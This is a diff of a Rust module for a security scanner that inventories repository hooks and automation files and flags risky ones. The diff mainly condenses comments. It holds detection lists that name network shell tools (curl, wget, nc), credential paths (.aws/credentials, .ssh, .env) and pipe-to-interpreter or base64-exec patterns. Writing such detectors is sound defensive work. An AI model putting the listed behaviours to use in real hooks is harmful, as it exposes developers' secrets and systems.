@@ -1,47 +1,25 @@
 //! Repo-hook + automation inventory and risk classification (M9 ch6).
 //!
-//! This module inventories the executable surfaces a repository can run on your
-//! behalf — git hooks, husky/lefthook/pre-commit hooks, package-manager
-//! lifecycle scripts, direnv `.envrc`, mise/asdf tool hooks — plus the
-//! "automation" surfaces a developer runs by hand (`Makefile`, `justfile`,
-//! `Taskfile.yml`). It powers `tirith hooks scan|guard|explain`.
+//! Inventories the executable surfaces a repo can run on your behalf — git hooks,
+//! husky/lefthook/pre-commit, package-manager lifecycle scripts, direnv `.envrc`,
+//! mise/asdf hooks — plus hand-run "automation" (`Makefile`, `justfile`, `Taskfile`).
+//! Powers `tirith hooks scan|guard|explain`. Static read only — never executes a hook.
 //!
-//! ## Two surfaces, two entry points
+//! Two entry points:
+//! 1. **Full inventory** ([`scan_for_repo`] / [`scan_for_cwd`]) — every surface; what
+//!    `tirith hooks scan` calls.
+//! 2. **Hot-path leader-targeted** ([`scan_triggered_by_leader`]) — scans ONLY the hooks
+//!    a leader triggers (`git commit` → pre-commit etc., NOT pre-push or the Makefile),
+//!    keeping the hot path narrow. Gated behind `policy.hooks_guard_enabled`.
 //!
-//! 1. **Full inventory** ([`scan_for_repo`] / [`scan_for_cwd`]) — enumerates
-//!    EVERY surface (hooks + automation) and classifies each body. This is what
-//!    `tirith hooks scan` calls. Static read only: a hook is read as text and
-//!    classified, never executed.
+//! The five rules (`RepoHookNetworkCall`, `RepoHookCredentialRead`, `RepoHookSudo`,
+//! `RepoHookSuspiciousShellPattern`, `RepoHookExternalFetch`) carry NO PATTERN_TABLE
+//! entry — the trigger is repo STATE plus a hot-path git/pkg command, not an input regex.
+//! All five live in `EXTERNALLY_TRIGGERED_RULES`.
 //!
-//! 2. **Hot-path leader-targeted scan** ([`scan_triggered_by_leader`]) — given a
-//!    parsed command leader (`git`, `npm`, `direnv`, …) and its subcommand,
-//!    scans ONLY the hook types that leader actually triggers. `git commit`
-//!    checks `pre-commit` / `prepare-commit-msg` / `commit-msg`, NOT `pre-push`
-//!    and NOT the `Makefile` (the user did not invoke `make`). This keeps the
-//!    engine hot path narrow. The engine gates this behind
-//!    `policy.hooks_guard_enabled`.
-//!
-//! ## The 5 rules are externally triggered
-//!
-//! The five rules — [`crate::verdict::RuleId::RepoHookNetworkCall`],
-//! [`RepoHookCredentialRead`](crate::verdict::RuleId::RepoHookCredentialRead),
-//! [`RepoHookSudo`](crate::verdict::RuleId::RepoHookSudo),
-//! [`RepoHookSuspiciousShellPattern`](crate::verdict::RuleId::RepoHookSuspiciousShellPattern),
-//! [`RepoHookExternalFetch`](crate::verdict::RuleId::RepoHookExternalFetch) —
-//! fire from this scanner. The three that can fire on the engine hot path
-//! (network call / credential read / sudo, surfaced when `hooks_guard_enabled`
-//! is set) still carry no PATTERN_TABLE entry — the trigger is repo STATE plus
-//! a hot-path git/package-manager command, not a regex on the user's input.
-//! All five live in `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests here
-//! against `tempfile::tempdir()` roots.
-//!
-//! ## Cache (hot-path perf)
-//!
-//! [`scan_triggered_by_leader`] consults a process-global, repo-root-keyed cache
-//! with a 60s TTL ([`HOOK_CACHE_TTL`]). The cache is additionally keyed on the
-//! aggregate mtime of the scanned surfaces, so editing a hook invalidates it
-//! immediately. A `git pull` / `git checkout` (which can rewrite hooks /
-//! configs) explicitly busts the cache via [`invalidate_cache_for`].
+//! Cache: [`scan_triggered_by_leader`] uses a process-global, repo-root-keyed cache (60s
+//! TTL, also keyed on surface mtime so a hook edit busts it). `git pull`/`checkout`
+//! explicitly busts via [`invalidate_cache_for`] (they can rewrite hooks).
 
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
@@ -52,25 +30,18 @@ use serde::{Deserialize, Serialize};
 
 use crate::verdict::{RuleId, Severity};
 
-/// How long a hot-path leader-targeted scan is cached, keyed by repo root +
-/// surface mtime fingerprint. Re-running a git/package-manager command within
-/// this window reuses the cached classification instead of re-reading every
-/// hook file. The full `tirith hooks scan` inventory bypasses the cache.
+/// TTL for the hot-path leader-targeted scan cache. The full `tirith hooks scan`
+/// inventory bypasses the cache.
 pub const HOOK_CACHE_TTL: Duration = Duration::from_secs(60);
 
-/// Whether a surface is a *hook* (run automatically by a tool on a lifecycle
-/// event) or *automation* (a task runner the developer invokes by hand). The
-/// scan output keeps the two categories separate: hooks are the auto-exec
-/// attack surface, automation is reported for inventory completeness only.
+/// Whether a surface is a *hook* (auto-run on a lifecycle event — the attack surface)
+/// or *automation* (a task runner run by hand — inventoried for completeness only).
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum HookCategory {
-    /// Auto-executed on a tool lifecycle event (git hook, husky, lefthook,
-    /// pre-commit, npm lifecycle script, `.envrc`, mise/asdf hook).
+    /// Auto-executed on a tool lifecycle event.
     Hook,
-    /// A task runner the developer invokes explicitly (`make`, `just`, `task`).
-    /// NOT auto-scanned per package-manager command; inventoried only by the
-    /// explicit `tirith hooks scan`.
+    /// A task runner the developer invokes explicitly; not auto-scanned per command.
     Automation,
 }
 
@@ -83,9 +54,7 @@ impl HookCategory {
     }
 }
 
-/// Which tool owns a surface. Drives `explain` output and the per-leader
-/// targeting (e.g. only `Git` + `Husky` + `Lefthook` + `PreCommit` surfaces are
-/// triggered by a `git commit`).
+/// Which tool owns a surface. Drives `explain` output and per-leader targeting.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum HookProvider {
@@ -129,9 +98,7 @@ impl HookProvider {
 
     fn category(self) -> HookCategory {
         match self {
-            // Task runners + mise/asdf tool hooks are reported under
-            // "automation" (the spec: mise/asdf are NOT auto-scanned per
-            // package-manager command; they're inventory-only like make/just).
+            // Task runners + mise/asdf are "automation" — inventory-only, not auto-scanned.
             HookProvider::Makefile
             | HookProvider::Justfile
             | HookProvider::Taskfile
@@ -144,8 +111,7 @@ impl HookProvider {
 /// One enumerated hook / automation surface, with its body and any findings.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct RepoHookEntry {
-    /// Display name of the hook / surface (`pre-commit`, `postinstall`,
-    /// `Makefile`, `.envrc`, …).
+    /// Display name (`pre-commit`, `postinstall`, `Makefile`, `.envrc`, …).
     pub name: String,
     /// hook vs automation.
     pub category: HookCategory,
@@ -153,13 +119,11 @@ pub struct RepoHookEntry {
     pub provider: HookProvider,
     /// The file the body was read from.
     pub source_path: PathBuf,
-    /// The (possibly large) body text classified. Empty when the file could not
-    /// be read as UTF-8 text. NEVER printed verbatim by the CLI — it is
-    /// credential-redacted at the presentation layer.
+    /// Classified body text (empty on non-UTF-8). NEVER printed verbatim — the CLI
+    /// credential-redacts it at the presentation layer.
     pub body: String,
-    /// The git lifecycle event(s) this surface triggers on, when applicable
-    /// (`pre-commit`, `pre-push`, …). Used by the per-leader hot-path targeting.
-    /// Empty for automation surfaces and package lifecycle scripts.
+    /// Git lifecycle event(s) this surface triggers (for per-leader targeting); empty
+    /// for automation and package lifecycle scripts.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub git_events: Vec<String>,
     /// Findings against this entry's body.
@@ -191,8 +155,7 @@ pub struct RepoHookFinding {
     pub provider: HookProvider,
     /// Human-readable location (full file path).
     pub location: String,
-    /// Short description of *why* the rule fired. Echoes a matched token, never
-    /// the surrounding body (which may carry a secret).
+    /// Why the rule fired. Echoes the matched token only, never the body (may hold a secret).
     pub detail: String,
 }
 
@@ -239,13 +202,9 @@ impl RepoHookScan {
     }
 }
 
-// ─── public entry points ─────────────────────────────────────────────────────
-
-/// Full inventory scan of the repo containing the current working directory.
-/// Resolves the repo root via [`crate::policy::find_repo_root`]; if there is no
-/// `.git` boundary, the cwd itself is used as the scan root so a non-git project
-/// (a bare checkout, a worktree) still gets `Makefile` / `package.json` /
-/// `.envrc` coverage. Returns an empty scan when no root resolves.
+/// Full inventory scan of the repo containing the cwd. Resolves the repo root via
+/// [`crate::policy::find_repo_root`], falling back to the cwd when there's no `.git`
+/// boundary so a non-git project still gets coverage. Empty scan when no root resolves.
 pub fn scan_for_cwd() -> RepoHookScan {
     let root = crate::policy::find_repo_root(None).or_else(|| std::env::current_dir().ok());
     match root {
@@ -254,9 +213,8 @@ pub fn scan_for_cwd() -> RepoHookScan {
     }
 }
 
-/// Testable full-inventory entry point: enumerate + classify every hook /
-/// automation surface under `repo_root`. Static read only; never executes a
-/// hook. Tests pass a `tempfile::tempdir()` path here.
+/// Testable full-inventory entry point: enumerate + classify every surface under
+/// `repo_root`. Static read only.
 pub fn scan_for_repo(repo_root: &Path) -> RepoHookScan {
     let entries = collect_all(repo_root);
     RepoHookScan {
@@ -265,9 +223,8 @@ pub fn scan_for_repo(repo_root: &Path) -> RepoHookScan {
     }
 }
 
-/// Look up a single surface by name (`pre-commit`, `postinstall`, `Makefile`,
-/// …) for `tirith hooks explain`. Returns every matching entry (a name like
-/// `pre-commit` can exist under `.git/hooks`, `.husky`, AND `lefthook.yml`).
+/// Look up a surface by name for `tirith hooks explain`. Returns every matching entry
+/// (a name like `pre-commit` can exist under `.git/hooks`, `.husky`, AND `lefthook.yml`).
 pub fn explain_for_cwd(name: &str) -> Vec<RepoHookEntry> {
     let scan = scan_for_cwd();
     scan.entries
@@ -285,27 +242,19 @@ pub fn explain_for_repo(repo_root: &Path, name: &str) -> Vec<RepoHookEntry> {
         .collect()
 }
 
-/// Hot-path leader-targeted scan. Given the resolved repo root, the command
-/// leader (`git`, `npm`, `yarn`, `pnpm`, `direnv`), and the leader's first
-/// subcommand argument, return the findings ONLY for the hook surfaces that
-/// leader actually triggers.
+/// Hot-path leader-targeted scan: findings ONLY for the hooks `leader` + `subcommand`
+/// actually triggers. `None` when not a hook-triggering command (engine skips cheaply);
+/// `Some(vec![])` when triggering but clean.
 ///
-/// Returns `None` when the leader is not a hook-triggering command (so the
-/// engine can skip the whole path cheaply). Returns `Some(vec![])` when the
-/// leader IS hook-triggering but no triggered hook carries a finding.
-///
-/// Per-leader targeting (the load-bearing scope decision):
-/// - `git commit` → `pre-commit`, `prepare-commit-msg`, `commit-msg`,
-///   `post-commit` (git + husky + lefthook + pre-commit).
-/// - `git push` → `pre-push`.
-/// - `git pull` / `git merge` / `git rebase` / `git checkout` → `post-merge`,
-///   `post-checkout`, `post-rewrite` (the events these emit); the cache is
-///   INVALIDATED first because these can rewrite hooks / configs.
-/// - `npm/yarn/pnpm install|ci|run` → `package.json` lifecycle scripts only.
+/// Per-leader targeting (load-bearing scope):
+/// - `git commit` → pre-commit, prepare-commit-msg, commit-msg, post-commit.
+/// - `git push` → pre-push.
+/// - `git pull`/`merge`/`rebase`/`checkout` → post-merge/checkout/rewrite; cache busted
+///   first (these can rewrite hooks).
+/// - `npm/yarn/pnpm install|ci` → `package.json` lifecycle scripts only.
 /// - `direnv allow|reload` → `.envrc` only.
 ///
-/// `Makefile` / `justfile` / `Taskfile` are NEVER returned here — the user did
-/// not invoke `make`/`just`/`task`. They are inventory-only.
+/// `Makefile`/`justfile`/`Taskfile` are NEVER returned (inventory-only).
 pub fn scan_triggered_by_leader(
     repo_root: &Path,
     leader: &str,
@@ -313,8 +262,7 @@ pub fn scan_triggered_by_leader(
 ) -> Option<Vec<RepoHookFinding>> {
     let target = LeaderTarget::resolve(leader, subcommand)?;
 
-    // `git pull`/`checkout`/`merge`/`rebase` can rewrite hooks — bust the cache
-    // so the next scan re-reads from disk.
+    // `git pull`/`checkout`/`merge`/`rebase` can rewrite hooks — bust the cache.
     if target.invalidate_cache {
         invalidate_cache_for(repo_root);
     }
@@ -330,32 +278,28 @@ pub fn scan_triggered_by_leader(
     Some(findings)
 }
 
-/// `true` when `leader` + `subcommand` form a hook-triggering command
-/// (`git commit`, `npm install`, `direnv allow`, …). Cheap, allocation-light
-/// predicate the engine uses to decide whether to force past the tier-1
-/// fast-exit when `hooks_guard_enabled` is set — without it, a clean-looking
-/// `git commit` would never reach the hot-path hook scan.
+/// `true` when `leader` + `subcommand` form a hook-triggering command. Cheap predicate
+/// the engine uses to force past the tier-1 fast-exit under `hooks_guard_enabled` —
+/// without it a clean-looking `git commit` would never reach the hook scan.
 pub fn is_hook_triggering_leader(leader: &str, subcommand: Option<&str>) -> bool {
     LeaderTarget::resolve(leader, subcommand).is_some()
 }
 
-/// What a hot-path leader triggers. Built by [`LeaderTarget::resolve`]; `None`
-/// when the leader is not a hook-triggering command.
+/// What a hot-path leader triggers. Built by [`LeaderTarget::resolve`].
 struct LeaderTarget {
-    /// Git lifecycle events the leader fires (empty for non-git leaders).
+    /// Git lifecycle events fired (empty for non-git leaders).
     git_events: &'static [&'static str],
     /// Whether `package.json` lifecycle scripts are triggered.
     package_lifecycle: bool,
     /// Whether `.envrc` (direnv) is triggered.
     direnv: bool,
-    /// Whether to bust the cache before scanning (git pull/checkout/merge/rebase).
+    /// Whether to bust the cache first (git pull/checkout/merge/rebase).
     invalidate_cache: bool,
 }
 
 impl LeaderTarget {
     fn resolve(leader: &str, subcommand: Option<&str>) -> Option<Self> {
-        // Normalize the leader to its basename (a `/usr/bin/git` leader still
-        // counts), lowercased for case-insensitive matching of e.g. `GIT`.
+        // Basename + lowercase so `/usr/bin/git` and `GIT` both match.
         let leader = leader_basename(leader).to_ascii_lowercase();
         let sub = subcommand.map(|s| s.to_ascii_lowercase());
         let sub = sub.as_deref();
@@ -387,11 +331,8 @@ impl LeaderTarget {
                 })
             }
             "npm" => match sub {
-                // Only `install` / `i` / `ci` run the package.json lifecycle
-                // scripts (preinstall/install/postinstall/prepare). `npm run
-                // <script>` runs ONE named script and does NOT trigger the
-                // install lifecycle, so it must not surface preinstall/
-                // postinstall findings (they don't execute for `npm run build`).
+                // Only install/i/ci run the lifecycle scripts; `npm run <script>` runs one
+                // named script and must NOT surface preinstall/postinstall findings.
                 Some("install") | Some("i") | Some("ci") => Some(LeaderTarget {
                     git_events: &[],
                     package_lifecycle: true,
@@ -401,7 +342,7 @@ impl LeaderTarget {
                 _ => None,
             },
             "yarn" | "pnpm" => match sub {
-                // `yarn`/`pnpm` with no subcommand also installs.
+                // No subcommand also installs.
                 None | Some("install") | Some("ci") => Some(LeaderTarget {
                     git_events: &[],
                     package_lifecycle: true,
@@ -432,15 +373,16 @@ impl LeaderTarget {
             | HookProvider::Husky
             | HookProvider::Lefthook
             | HookProvider::PreCommit => {
-                // Match by git event when this leader fires git events.
+                // Match by git event; fall back to matching the hook NAME when we
+                // couldn't tag it with a git_event.
                 !self.git_events.is_empty()
-                    && (entry.git_events.iter().any(|e| self.git_events.contains(&e.as_str()))
-                        // A git/husky hook whose NAME is the event but which we
-                        // could not tag with a git_event still matches by name.
+                    && (entry
+                        .git_events
+                        .iter()
+                        .any(|e| self.git_events.contains(&e.as_str()))
                         || self.git_events.contains(&entry.name.as_str()))
             }
-            // Automation (Makefile/justfile/Taskfile) + mise/asdf are never
-            // triggered by a package-manager / git / direnv command.
+            // Automation + mise/asdf are never triggered by a pkg/git/direnv command.
             HookProvider::Makefile
             | HookProvider::Justfile
             | HookProvider::Taskfile
@@ -459,11 +401,8 @@ fn leader_basename(leader: &str) -> &str {
         .unwrap_or(leader)
 }
 
-// ─── cache ─────────────────────────────────────────────────────────────────────
-
-/// One cached full-inventory scan, keyed by repo root + a surface mtime
-/// fingerprint. The fingerprint busts the cache the moment any scanned hook
-/// file changes; the TTL bounds staleness for never-touched repos.
+/// One cached full-inventory scan, keyed by repo root + surface mtime fingerprint
+/// (busts on any hook-file change; TTL bounds staleness for untouched repos).
 struct HookCacheEntry {
     root: PathBuf,
     fingerprint: u64,
@@ -473,14 +412,12 @@ struct HookCacheEntry {
 
 static HOOK_CACHE: Mutex<Option<HookCacheEntry>> = Mutex::new(None);
 
-/// Return a cached inventory for `repo_root` when one is fresh (same root, same
-/// mtime fingerprint, within [`HOOK_CACHE_TTL`]); otherwise scan and cache.
+/// Return a fresh cached inventory for `repo_root` (same root + fingerprint, within
+/// [`HOOK_CACHE_TTL`]); otherwise scan and cache.
 fn cached_scan(repo_root: &Path) -> RepoHookScan {
     let fingerprint = surface_fingerprint(repo_root);
 
-    // Recover from a poisoned lock (a panic while another thread held it, e.g.
-    // in a test) rather than letting the cache stay broken for the process's
-    // lifetime: the guarded value is a plain data cache, safe to reuse.
+    // Recover from a poisoned lock — the guarded value is a plain data cache, safe to reuse.
     {
         let guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
         if let Some(entry) = guard.as_ref() {
@@ -508,25 +445,22 @@ fn cached_scan(repo_root: &Path) -> RepoHookScan {
     scan
 }
 
-/// Drop any cached scan for `repo_root`. Called before a `git pull`/`checkout`/
-/// `merge`/`rebase` targeted scan, since those commands can rewrite hooks.
+/// Drop any cached scan for `repo_root` (before a git pull/checkout/merge/rebase scan,
+/// which can rewrite hooks).
 pub fn invalidate_cache_for(repo_root: &Path) {
-    // Recover from a poisoned lock (see [`cached_scan`]).
     let mut guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
     if guard.as_ref().map(|e| e.root == repo_root).unwrap_or(false) {
         *guard = None;
     }
 }
 
-/// Combine the mtimes of the hook-bearing surfaces into a single fingerprint.
-/// A change to any surface (or adding/removing one) changes the value, busting
-/// the cache. Cheap: a handful of `stat`s on small, well-known paths.
+/// Combine the hook-bearing surfaces' mtimes into one fingerprint; any add/remove/edit
+/// changes it, busting the cache. Cheap (a handful of `stat`s).
 fn surface_fingerprint(repo_root: &Path) -> u64 {
     use std::hash::Hasher;
     let mut hasher = std::collections::hash_map::DefaultHasher::new();
 
-    // The set of paths whose mtime feeds the fingerprint. Directories are
-    // walked one level (their entries' mtimes matter).
+    // Directories are walked one level (their entries' mtimes matter).
     let git_hooks = repo_root.join(".git/hooks");
     if let Ok(rd) = std::fs::read_dir(&git_hooks) {
         for entry in rd.flatten() {
@@ -558,8 +492,7 @@ fn fingerprint_path(path: &Path, hasher: &mut impl std::hash::Hasher) {
     }
 }
 
-/// Single-file surfaces whose mtime feeds the cache fingerprint (and which
-/// `collect_all` reads).
+/// Single-file surfaces whose mtime feeds the fingerprint (and that `collect_all` reads).
 const SINGLE_FILE_SURFACES: &[&str] = &[
     "lefthook.yml",
     "lefthook.yaml",
@@ -578,8 +511,6 @@ const SINGLE_FILE_SURFACES: &[&str] = &[
     "Taskfile.yaml",
 ];
 
-// ─── collection ──────────────────────────────────────────────────────────────
-
 /// Enumerate every hook / automation surface under `repo_root`.
 fn collect_all(repo_root: &Path) -> Vec<RepoHookEntry> {
     let mut entries = Vec::new();
@@ -596,8 +527,7 @@ fn collect_all(repo_root: &Path) -> Vec<RepoHookEntry> {
     entries
 }
 
-/// The git hooks that are real lifecycle hooks (not the `*.sample` files git
-/// ships). We read any non-`.sample` file in `.git/hooks`.
+/// Read any non-`.sample` file in `.git/hooks` (git's shipped samples are inert).
 fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let dir = repo_root.join(".git/hooks");
     let Ok(rd) = std::fs::read_dir(&dir) else {
@@ -625,8 +555,8 @@ fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// husky v5+ stores one script per git-event filename under `.husky/`
-/// (`.husky/pre-commit`, …). `.husky/_/` is husky's own bootstrap dir — skip it.
+/// husky v5+ stores one script per git-event under `.husky/`. `.husky/_/` is its
+/// bootstrap dir — skip it.
 fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let dir = repo_root.join(".husky");
     let Ok(rd) = std::fs::read_dir(&dir) else {
@@ -653,11 +583,9 @@ fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// Read a git/husky hook FILE (already confirmed to exist) and push its entry.
-/// If the file cannot be read as UTF-8 text (permission-denied or non-UTF-8),
-/// we do NOT silently treat it as empty — a deliberately-unreadable hook is
-/// exactly the one a scan must not miss. Instead we push an entry carrying an
-/// Info "present but unreadable — review manually" finding so it surfaces.
+/// Read a git/husky hook FILE and push its entry. An unreadable file (perms / non-UTF-8)
+/// is NOT silently dropped — a deliberately-unreadable hook is the one a scan must not
+/// miss — it surfaces as an Info "present but unreadable" finding.
 fn push_hook_file(
     out: &mut Vec<RepoHookEntry>,
     name: String,
@@ -692,10 +620,8 @@ fn push_hook_file(
     }
 }
 
-/// `lefthook.yml` names commands per git event. We treat the whole config as one
-/// classifiable body per top-level git event we can find, so a `run:` line with
-/// a `curl` fires. Best-effort YAML-ish parse: we scan for top-level event keys
-/// and attribute the command lines under each to that event.
+/// Parse `lefthook.yml` into one classifiable body per top-level git event (so a `run:`
+/// `curl` fires). Best-effort YAML-ish: scan top-level event keys, attribute lines under each.
 fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in ["lefthook.yml", "lefthook.yaml"] {
         let path = repo_root.join(rel);
@@ -716,9 +642,8 @@ fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// Extract `(git_event, body)` blocks from a lefthook config. A top-level key
-/// that names a known git event (`pre-commit:`, `pre-push:`, …) starts a block;
-/// every more-indented line until the next top-level key is its body.
+/// Extract `(git_event, body)` blocks: a top-level key naming a known git event starts a
+/// block; every more-indented line until the next top-level key is its body.
 fn lefthook_events(contents: &str) -> Vec<(String, String)> {
     let mut out: Vec<(String, String)> = Vec::new();
     let mut current: Option<(String, String)> = None;
@@ -753,10 +678,8 @@ fn lefthook_events(contents: &str) -> Vec<(String, String)> {
     out
 }
 
-/// `.pre-commit-config.yaml` names hook repos + `entry:` commands. We classify
-/// the whole file body under the `pre-commit` event (the default stage) plus any
-/// explicit `stages:` we recognize. Best-effort: the body is the full file, so a
-/// local `entry: curl …` fires.
+/// Classify `.pre-commit-config.yaml` (whole file body) under the `pre-commit` event, so
+/// a local `entry: curl …` fires.
 fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
         let path = repo_root.join(rel);
@@ -775,9 +698,8 @@ fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// `package.json` lifecycle scripts (`preinstall`/`install`/`postinstall`/
-/// `prepare`). Each becomes its own entry (no git event — they fire on
-/// `npm install`). Parsed with `serde_json`; a malformed manifest is skipped.
+/// `package.json` lifecycle scripts (preinstall/install/postinstall/prepare), each its own
+/// entry (no git event). Parsed with `serde_json`; a malformed manifest is skipped.
 fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join("package.json");
     let Some(contents) = read_text(&path) else {
@@ -804,8 +726,7 @@ fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. The whole file
-/// is the body.
+/// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. Whole file is the body.
 fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join(".envrc");
     let Some(contents) = read_text(&path) else {
@@ -821,9 +742,8 @@ fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     );
 }
 
-/// mise / asdf tool hooks: `mise.toml` / `.mise.toml` carry `[hooks]` / `[env]`
-/// run lines; `.tool-versions` is asdf's plugin list. Reported under the
-/// "automation" category per the spec (not auto-scanned per package command).
+/// mise/asdf tool hooks (`mise.toml`, `.mise.toml`, `.tool-versions`). Reported under
+/// "automation" per the spec (not auto-scanned per package command).
 fn collect_mise(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let surfaces: &[(&str, HookProvider)] = &[
         ("mise.toml", HookProvider::Mise),
@@ -833,8 +753,7 @@ fn collect_mise(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     collect_named_surfaces(repo_root, surfaces, out);
 }
 
-/// Automation task runners: `Makefile`, `justfile`, `Taskfile.yml`. Reported
-/// under "automation" — inventory only, never auto-scanned by a package command.
+/// Automation task runners (`Makefile`, `justfile`, `Taskfile.yml`) — inventory only.
 fn collect_automation(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let surfaces: &[(&str, HookProvider)] = &[
         ("Makefile", HookProvider::Makefile),
@@ -847,11 +766,9 @@ fn collect_automation(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     collect_named_surfaces(repo_root, surfaces, out);
 }
 
-/// Read each `(relative_name, provider)` surface under `repo_root`, deduplicated
-/// by canonical path. The dedup matters on case-insensitive filesystems (macOS,
-/// Windows) where `Makefile` and `makefile` — or `mise.toml` listed twice —
-/// resolve to the SAME file; without it the same surface would be inventoried
-/// (and double-classified) more than once.
+/// Read each `(relative_name, provider)` surface under `repo_root`, deduplicated by
+/// canonical path — matters on case-insensitive filesystems where `Makefile`/`makefile`
+/// resolve to the same file and would otherwise be inventoried twice.
 fn collect_named_surfaces(
     repo_root: &Path,
     surfaces: &[(&str, HookProvider)],
@@ -878,8 +795,7 @@ fn collect_named_surfaces(
     }
 }
 
-/// Build + classify an entry, appending it to `out`. Classification runs the
-/// five rules over the body.
+/// Build + classify an entry (the five rules over its body) and append it to `out`.
 fn push_entry(
     out: &mut Vec<RepoHookEntry>,
     name: String,
@@ -902,10 +818,8 @@ fn push_entry(
     });
 }
 
-// ─── classification (the 5 rules) ──────────────────────────────────────────────
-
-/// Run the five repo-hook rules over a hook body. Order: the High rules first,
-/// then the Medium rules, so the most severe finding is listed first.
+/// Run the five repo-hook rules over a hook body, High rules first so the most severe
+/// finding is listed first.
 fn classify_body(
     name: &str,
     provider: HookProvider,
@@ -926,8 +840,7 @@ fn classify_body(
         detail,
     };
 
-    // Rule 1 — network call (High): curl / wget / nc / ncat / netcat as a
-    // command word.
+    // Rule 1 — network call (High): curl/wget/nc/ncat/netcat as a command word.
     if let Some(tool) = body_network_tool(body) {
         out.push(mk(
             RuleId::RepoHookNetworkCall,
@@ -954,8 +867,7 @@ fn classify_body(
         ));
     }
 
-    // Rule 4 — suspicious shell pattern (Medium): pipe-to-interpreter or
-    // base64-decode-then-exec inside the hook.
+    // Rule 4 — suspicious shell pattern (Medium): pipe-to-interpreter / base64-decode-exec.
     if let Some(detail) = body_suspicious_shell_pattern(body) {
         out.push(mk(
             RuleId::RepoHookSuspiciousShellPattern,
@@ -964,13 +876,8 @@ fn classify_body(
         ));
     }
 
-    // Rule 5 — external fetch (Medium): fetches an external resource via a
-    // non-curl/wget downloader or a URL handed to a package/script fetcher.
-    // Reported ONLY when the network-call rule (Rule 1) did NOT already fire on
-    // a curl/wget command word — those are the High path and would otherwise
-    // double-report the same fetch. This rule catches the OTHER fetchers (npx /
-    // pnpm dlx / a bare URL handed to a config or helper). Mutually exclusive
-    // with Rule 1, matching the module + rule docs.
+    // Rule 5 — external fetch (Medium): npx / pnpm dlx / a bare URL handed to a fetcher.
+    // Mutually exclusive with Rule 1 — skip when the curl/wget High path already fired.
     let network_call_fired = out.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall);
     if !network_call_fired {
         if let Some(detail) = body_external_fetch(body) {
@@ -992,8 +899,7 @@ fn body_network_tool(body: &str) -> Option<&'static str> {
 
 /// Credential-path fragments a hook body must not read. Returns the first match.
 fn body_reads_credential(body: &str) -> Option<String> {
-    // Specific sub-paths / filenames: a plain substring match is safe — these
-    // are distinctive enough that a false positive is implausible.
+    // Specific sub-paths/filenames: a plain substring match is safe (distinctive enough).
     const SPECIFIC: &[&str] = &[
         ".aws/credentials",
         ".aws/config",
@@ -1011,11 +917,8 @@ fn body_reads_credential(body: &str) -> Option<String> {
             return Some((*frag).to_string());
         }
     }
-    // Bare credential roots: match ONLY at a path boundary so `.env` does not
-    // fire on `.environment` / `development.env-example`, and `.ssh` / `.aws`
-    // do not fire on `mydir.sshconfig`. A match requires the fragment to be
-    // followed by a path separator, end-of-token, or a quote — i.e. it is the
-    // last component or a directory in a referenced path.
+    // Bare roots: match only at a path boundary so `.env` doesn't fire on `.environment`
+    // and `.ssh`/`.aws` don't fire on `mydir.sshconfig` (see `references_bare_root`).
     const BARE_ROOTS: &[&str] = &[".aws", ".ssh", ".env"];
     for frag in BARE_ROOTS {
         if references_bare_root(body, frag) {
@@ -1025,11 +928,9 @@ fn body_reads_credential(body: &str) -> Option<String> {
     None
 }
 
-/// `true` when `frag` (a bare credential root like `.env` / `.ssh`) appears in
-/// `body` as a path component: preceded by a path/whitespace boundary AND
-/// followed by `/`, whitespace, a quote, end-of-string, or `.` (for `.env.local`
-/// / `.env.production`). Avoids the `.environment` / `.sshconfig` false positive
-/// that a plain `contains` would hit.
+/// `true` when `frag` (a bare credential root like `.env`/`.ssh`) appears in `body` as a
+/// path component (boundary before; `/`, whitespace, quote, EOS, or `.` after). Avoids the
+/// `.environment` / `.sshconfig` false positive a plain `contains` would hit.
 fn references_bare_root(body: &str, frag: &str) -> bool {
     let bytes = body.as_bytes();
     let flen = frag.len();
@@ -1081,10 +982,9 @@ fn references_bare_root(body: &str, frag: &str) -> bool {
     false
 }
 
-/// Detect a pipe-to-interpreter or base64-decode-then-exec pattern. Returns a
-/// description of the first pattern found.
+/// Detect a pipe-to-interpreter or base64-decode-then-exec pattern (first match).
 fn body_suspicious_shell_pattern(body: &str) -> Option<String> {
-    // Pipe to a shell interpreter: `… | sh`, `… | bash`, `… | zsh`, `… | python`.
+    // Pipe to a shell interpreter: `… | sh|bash|zsh|python|…`.
     const INTERPRETERS: &[&str] = &[
         "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl", "ruby", "node",
     ];
